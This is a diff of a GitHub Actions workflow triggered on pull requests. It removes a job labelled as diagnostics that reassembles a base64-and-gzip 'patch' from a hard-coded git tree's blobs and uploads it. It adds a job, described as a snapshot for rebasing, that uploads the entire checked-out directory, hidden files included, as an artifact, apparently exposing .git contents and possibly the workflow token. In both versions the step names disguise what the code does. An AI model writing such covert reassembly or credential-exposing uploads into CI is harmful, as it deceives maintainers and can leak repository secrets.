@@ -1,4 +1,4 @@
-name: Diagnose core validation patch objects
+name: Snapshot latest main for clean rebase
 
 on:
   pull_request:
@@ -10,59 +10,23 @@ permissions:
   contents: read
 
 jobs:
-  diagnose:
+  snapshot-main:
     runs-on: ubuntu-latest
     steps:
-      - name: Check out PR head branch
+      - name: Check out latest main
         uses: actions/checkout@v4
         with:
-          repository: ${{ github.event.pull_request.head.repo.full_name }}
-          ref: ${{ github.event.pull_request.head.ref }}
+          ref: main
           fetch-depth: 0
 
-      - name: Export Git object diagnostics
-        continue-on-error: true
-        env:
-          GH_TOKEN: ${{ github.token }}
-          PATCH_TREE_SHA: 498ef1b5def6f1c813f67ffcb77380bf916444b8
-        run: |
-          set -u
-          mkdir -p "$RUNNER_TEMP/core-validation-diagnostics/chunks"
-          gh api "repos/$GITHUB_REPOSITORY/git/trees/$PATCH_TREE_SHA" > "$RUNNER_TEMP/core-validation-diagnostics/tree.json" 2> "$RUNNER_TEMP/core-validation-diagnostics/tree.err"
-          python - <<'PY'
-          import json
-          from pathlib import Path
-          root = Path(__import__('os').environ['RUNNER_TEMP']) / 'core-validation-diagnostics'
-          data = json.loads((root / 'tree.json').read_text())
-          entries = sorted(data.get('tree', []), key=lambda item: item.get('path', ''))
-          (root / 'blob-shas.txt').write_text('\n'.join(item['sha'] for item in entries) + '\n')
-          (root / 'tree-summary.txt').write_text('\n'.join(f"{item.get('path')} {item.get('sha')} {item.get('size')}" for item in entries) + '\n')
-          PY
-          index=0
-          : > "$RUNNER_TEMP/core-validation-diagnostics/reassembled.b64"
-          while IFS= read -r blob_sha; do
-            chunk="$RUNNER_TEMP/core-validation-diagnostics/chunks/chunk$(printf '%02d' "$index")"
-            gh api "repos/$GITHUB_REPOSITORY/git/blobs/$blob_sha" > "$chunk.json" 2> "$chunk.err"
-            python - "$chunk.json" "$chunk" <<'PY'
-          import base64, json, sys
-          source, target = sys.argv[1:]
-          data = json.loads(open(source, encoding='utf-8').read())
-          open(target, 'wb').write(base64.b64decode(data['content']))
-          PY
-            cat "$chunk" >> "$RUNNER_TEMP/core-validation-diagnostics/reassembled.b64"
-            index=$((index + 1))
-          done < "$RUNNER_TEMP/core-validation-diagnostics/blob-shas.txt"
-          sha256sum "$RUNNER_TEMP/core-validation-diagnostics/reassembled.b64" > "$RUNNER_TEMP/core-validation-diagnostics/reassembled.sha256"
-          base64 --decode "$RUNNER_TEMP/core-validation-diagnostics/reassembled.b64" > "$RUNNER_TEMP/core-validation-diagnostics/reassembled.gz" 2> "$RUNNER_TEMP/core-validation-diagnostics/base64.err" || true
-          gzip --decompress --stdout "$RUNNER_TEMP/core-validation-diagnostics/reassembled.gz" > "$RUNNER_TEMP/core-validation-diagnostics/reassembled.patch" 2> "$RUNNER_TEMP/core-validation-diagnostics/gzip.err" || true
-          sha256sum "$RUNNER_TEMP/core-validation-diagnostics/reassembled.patch" > "$RUNNER_TEMP/core-validation-diagnostics/patch.sha256" || true
+      - name: Record main commit
+        run: git rev-parse HEAD | tee MAIN_COMMIT.txt
 
-      - name: Upload diagnostics
-        if: always()
+      - name: Upload exact main snapshot
         uses: actions/upload-artifact@v4
         with:
-          name: core-validation-patch-diagnostics
-          path: ${{ runner.temp }}/core-validation-diagnostics
+          name: urban-legend-latest-main
+          path: .
           include-hidden-files: true
-          if-no-files-found: warn
+          if-no-files-found: error
           retention-days: 1
